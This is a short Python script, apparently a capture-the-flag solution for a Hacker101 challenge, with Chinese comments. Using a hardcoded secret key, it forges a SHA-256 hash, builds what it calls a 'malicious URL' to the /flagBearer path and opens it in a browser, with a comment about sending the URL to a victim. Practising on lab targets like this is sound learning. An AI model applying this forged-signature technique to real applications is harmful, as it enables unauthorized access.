import hashlib
import webbrowser

BASE_URL = "https://73eec6f764788a118bfee9f8657e7160.ctf.hacker101.com/appRoot"
SECRET_KEY = b"s00p3rs3cr3tk3y"


def exploit(target_path):
    # 1. 计算哈希
    m = hashlib.sha256()
    m.update(SECRET_KEY + target_path.encode())
    hash_val = m.hexdigest()

    # 2. 构造恶意URL
    malicious_url = f"{BASE_URL}{target_path}?&hash={hash_val}"

    # 3. 自动打开浏览器（或发送给受害者）
    webbrowser.open(malicious_url)
    return malicious_url


# 示例：获取flag
print("攻击URL:", exploit("/flagBearer"))
